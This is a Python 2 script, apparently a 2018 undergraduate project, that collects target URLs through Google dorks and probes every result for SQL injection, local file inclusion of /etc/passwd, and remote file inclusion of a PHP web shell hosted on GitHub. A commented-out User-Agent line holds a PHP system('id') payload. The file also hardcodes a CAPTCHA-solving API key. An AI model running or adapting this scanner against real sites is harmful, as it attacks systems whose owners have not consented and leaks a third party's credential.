"""
PROJETO PROTIPO
TCC EM CIENCIA DA COMPUTACAO
AUTOR: DENNYS A P OLIVEIRA.
2018.
"""
import requests
import sys
import re
from google import search


def main():

    print "##### Scan Google ######"
    #O PARAMETRO PASSADO NO GOOGLEENGINE EH A KEY DO 2CAPTCHA.COM USADA PARA RESOLVER CAPTCHAS VIA WEBSERVICE.
    buscar = search.GoogleEngine("777c64eaf7b22ead16668198b16266e1")
    print "Selecione a opcao desejada:\n 1) Pesquisar por string\n 2) Informar arquivo contendo strings\n 3) Executar testes no arquivo com hosts"
    opcao = raw_input("\nOpcao: ")
    string_busca = []
    if opcao == '1':
        string_busca.append(raw_input("Google Dork: "))

    elif opcao == '2':
        dorkfile = raw_input('Arquivo contendo strings: ')
        string_busca = open(dorkfile, 'rb').readlines()

    else:
        hostsfile = raw_input("Nome do arquivo com hosts: ")
        urls = open(hostsfile, 'rb').readlines()

    if opcao in ['1', '2']:
        urls = buscar.search(string_busca)
        #lfi_header = buscar.request_headers
        #lfi_header['User-Agent'] = "<?system('id');?>"
        print 'Total de resultados: ' + str(len(urls))
        nome_arquivo = raw_input("Nome do arquivo que deseja salvar: ")

        with open(nome_arquivo, "w") as f:
            f.writelines("\n".join(urls))
            f.close()
    i = 1
    vuln = []
    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'

    for fullurl in urls:
        fullurl = fullurl.replace('\n', '')
        sys.stdout.write("\r" + str(i) + "/" + str(len(urls)))
        sys.stdout.flush()
        m = re.search(p, fullurl)
        link = m.group('host')
        if link not in vuln:
            try:
                #vuln.append(link)
                resp = requests.get(str(fullurl) + "=1\' or \'1\' = \'1\''", headers=buscar.request_headers, timeout=1)
                body = resp.text
                fullbody = body
                if "You have an error in your SQL syntax" in fullbody:
                    print ("\n" + fullurl + " --> SQL injection vulnerable!")


                #SE QUISER ADICIONAR OUTROS TESTES DE VULNERABILIDADES.. SEGUE O MODELO ABAIXO.
                resp = requests.get(fullurl.split('=')[0] + '=../../../../../../etc/passwd', headers=buscar.request_headers, timeout=1)
                body = resp.text
                fullbody = body
                if "root:x:0:0:root:/root:/bin/bash" in fullbody:
                    print ("\n" + fullurl + " --> LFI vulnerable!")

                resp = requests.get(fullurl.split('=')[
                                        0] + '=https://raw.githubusercontent.com/huntergregal/tools/master/shells/simple_shell.php?cmd=id',
                                    headers=buscar.request_headers, timeout=1)
                body = resp.text
                fullbody = body
                if "uid=(" in fullbody:
                    print ("\n" + fullurl + " --> RFI vulnerable!")
                    


            except (requests.exceptions.ConnectionError, requests.exceptions.MissingSchema, requests.exceptions.ContentDecodingError, requests.exceptions.ReadTimeout, requests.exceptions.TooManyRedirects, TypeError):
                pass

        i += 1

    print "\n\nFIM!"


if __name__ == "__main__":
    main()
